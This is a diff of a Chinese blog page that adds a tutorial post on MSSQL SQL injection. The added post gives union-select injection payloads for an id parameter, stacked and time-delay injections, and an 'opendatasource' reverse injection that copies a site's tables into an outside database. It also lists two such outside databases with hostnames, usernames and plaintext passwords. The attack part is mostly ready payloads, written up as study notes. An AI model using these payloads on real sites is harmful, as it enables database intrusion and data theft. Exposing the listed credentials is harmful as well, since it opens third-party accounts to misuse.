@@ -20,18 +20,20 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="讲解反弹注入的原理以及MSSQL与MySQL的区别">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MsSQL和反弹注入">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/MsSQL%E5%92%8C%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="讲解反弹注入的原理以及MSSQL与MySQL的区别">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\dtxha\AppData\Roaming\Typora\typora-user-images\image-20230304094152995.png">
 <meta property="article:published_time" content="2023-08-21T08:31:51.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:31:51.590Z">
+<meta property="article:modified_time" content="2023-08-21T12:58:33.921Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\dtxha\AppData\Roaming\Typora\typora-user-images\image-20230304094152995.png">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/MsSQL%E5%92%8C%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/">
 
@@ -222,11 +224,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:31:51" itemprop="dateCreated datePublished" datetime="2023-08-21T16:31:51+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:31:51 / 修改时间：20:58:33" itemprop="dateCreated datePublished" datetime="2023-08-21T16:31:51+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">讲解反弹注入的原理以及MSSQL与MySQL的区别</div>
 
         </div>
       </header>
@@ -237,7 +250,31 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <p>mssql  =&gt; 就是  Sql Server</p>
+<p>mysql,mssql,Oracle,Access 并肩称作为四大主流数据库</p>
+<h1 id="1-mssql的显错注入-联合查询注入"><a href="#1-mssql的显错注入-联合查询注入" class="headerlink" title="1.mssql的显错注入(联合查询注入)"></a>1.mssql的显错注入(联合查询注入)</h1><h2 id="1-null的用法"><a href="#1-null的用法" class="headerlink" title="(1)null的用法"></a>(1)null的用法</h2><p>MSSQL的语法要求很严谨,不同类型的数据不能同时输出,所以判断出来字段数后需要用万能的null进行类型识别,一个一个排除,最终确定是否是int还是char</p>
+<p><img src="C:\Users\dtxha\AppData\Roaming\Typora\typora-user-images\image-20230304094152995.png" alt="image-20230304094152995"></p>
+<h2 id="2-MSSQL-没有database-函数"><a href="#2-MSSQL-没有database-函数" class="headerlink" title="(2)MSSQL 没有database()函数"></a>(2)MSSQL 没有database()函数</h2><p>所以查询的时候不能加where table_schema=database()</p>
+<h2 id="3-MSSQL的正统查询方法"><a href="#3-MSSQL的正统查询方法" class="headerlink" title="(3)MSSQL的正统查询方法"></a>(3)MSSQL的正统查询方法</h2><p>有些版本为了兼容MySQL用户的使用习惯,开发人员加了information_schema库等,但是正统的MSSQL做法如下</p>
+<p>1.U类型是用户创建的库, 而S类型是系统自带库</p>
+<p>2.因为没有information_schema作为表和字段的链接,所以mssql采用一个id作为字段与表的绑定(syscolumn里存在所有字段),此外,正统的为sysobjects(系统自带库,即所有表的集合),syscolumns.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select * from sysobjects where xtype=&#x27;u&#x27;-- qwe//查到表名,id等</span><br><span class="line"></span><br><span class="line">1&#x27; union select id,name,null from sysobjects where xtype=&#x27;U&#x27; -- qwe  //查到表名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#x27; union select id,name,null from syscolumns where id=1977058079 -- qwe //查到字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1 and 1=2 union select id,name,token from admin-- qwe</span><br></pre></td></tr></table></figure>
+<h2 id="4-逐条输出-重点"><a href="#4-逐条输出-重点" class="headerlink" title="(4)逐条输出[重点]"></a>(4)逐条输出[重点]</h2><p>因为mssql没有<strong>limit x,y</strong>  这个函数,所以不能做到很方便的逐条输出,然而大部分的网站都只能输出数据,而不会输出一个表</p>
+<p>1.如果数据少,可以逐条排除,比如看完第一条数据,查询语句之后加一个条件 and ‘字段’&lt;&gt;’第一条数据’(&lt;&gt;和!=都是不等于的意思),这样就可以一直只显示一条,但是数量太多时就不要这样了,太累,数据也太多</p>
+<p>2.所以这时候需要用到<strong>top</strong>方法,这时候access和mssql里的方法.此外还需要嵌套一条子查询配合<strong>not in</strong>语法进行排除查询过的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//具体语法</span><br><span class="line">select top 条数 字段 from 表名</span><br><span class="line"></span><br><span class="line">//前100条在ABC表的pp字段</span><br><span class="line">select top 100 pp from ABC;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select top 1  name from sysobjects where name not in (select top 1 name from sysobjects)</span><br><span class="line">//这样进行嵌套,可以做到逐条输出数据</span><br><span class="line"></span><br><span class="line">select top 1  name from sysobjects where name not in (select top 30 name from sysobjects)</span><br></pre></td></tr></table></figure>
+<h2 id="5-union-all"><a href="#5-union-all" class="headerlink" title="(5)union all"></a>(5)union all</h2><p>有时候重复数据union会自动去重,用union all可以查询所有</p>
+<h1 id="2-MSSQL的反弹注入"><a href="#2-MSSQL的反弹注入" class="headerlink" title="2.MSSQL的反弹注入"></a>2.MSSQL的反弹注入</h1><h2 id="1-opendatasource-函数"><a href="#1-opendatasource-函数" class="headerlink" title="(1)opendatasource()函数"></a>(1)opendatasource()函数</h2><p>主要利用的是这个链接函数,把网站数据库查询到的内容插入到外部其他数据库</p>
+<h2 id="2-两个白嫖的数据库"><a href="#2-两个白嫖的数据库" class="headerlink" title="(2)两个白嫖的数据库"></a>(2)两个白嫖的数据库</h2><p>地址：den1.mssql8.gear.host<br>初始化库：zkaqzkaq1n<br>账户名：zkaqzkaq1n<br>密码：Rz7VjmvQ!6e~</p>
+<p>连接地址：SQL5095.site4now.net<br>库名： DB_14DC259_a94<br>用户名：DB_14DC259_a94_admin<br>密码：nsqvcf96310</p>
+<h2 id="3-语法原理结构"><a href="#3-语法原理结构" class="headerlink" title="(3)语法原理结构"></a>(3)语法原理结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5009.webweb.com,1433;uid=DB_14A5E44_zkaq_admin;pwd=zkaqzkaq;database=DB_14A5E44_zkaq&#x27;).DB_14A5E44_zkaq.dbo.temp select * from admin --qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>1.堆叠注入:用户输入的分号能够生效，把前面的SQL语句给完结，后面写的SQL语句能执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;select name from sysobjects WAITFOR DELAY &#x27;0:0:15&#x27; -- qwe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//MSSQL的延时(没有sleep()了)   WAITFOR DELAY &#x27;0:0:4&#x27; --   表示延迟4秒</span><br></pre></td></tr></table></figure>
+<p>2.库.表.字段　　＝＞　连接.库.dbo.表.字段</p>
+<p>3.obb(数据外带) : 通过一定手法,让目标主动的把我们想要的数据发送出来(比如dns注入)</p>
+<h2 id="4-整体代码"><a href="#4-整体代码" class="headerlink" title="(4)整体代码"></a>(4)整体代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=den1.mssql8.gear.host,1433;uid=zkaqzkaq1n;pwd=Rz7VjmvQ!6e~;database=zkaqzkaq1n&#x27;).zkaqzkaq1n.dbo.abcd select id,name,xtype,uid from sysobjects -- qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
     </div>
 
     
@@ -262,6 +299,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
 
         
 
@@ -335,6 +375,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-mssql%E7%9A%84%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">1.mssql的显错注入(联合查询注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-null%E7%9A%84%E7%94%A8%E6%B3%95"><span class="nav-text">(1)null的用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-MSSQL-%E6%B2%A1%E6%9C%89database-%E5%87%BD%E6%95%B0"><span class="nav-text">(2)MSSQL 没有database()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-MSSQL%E7%9A%84%E6%AD%A3%E7%BB%9F%E6%9F%A5%E8%AF%A2%E6%96%B9%E6%B3%95"><span class="nav-text">(3)MSSQL的正统查询方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E9%80%90%E6%9D%A1%E8%BE%93%E5%87%BA-%E9%87%8D%E7%82%B9"><span class="nav-text">(4)逐条输出[重点]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-union-all"><span class="nav-text">(5)union all</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-MSSQL%E7%9A%84%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5"><span class="nav-text">2.MSSQL的反弹注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-opendatasource-%E5%87%BD%E6%95%B0"><span class="nav-text">(1)opendatasource()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%B8%A4%E4%B8%AA%E7%99%BD%E5%AB%96%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">(2)两个白嫖的数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E8%AF%AD%E6%B3%95%E5%8E%9F%E7%90%86%E7%BB%93%E6%9E%84"><span class="nav-text">(3)语法原理结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%95%B4%E4%BD%93%E4%BB%A3%E7%A0%81"><span class="nav-text">(4)整体代码</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +398,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
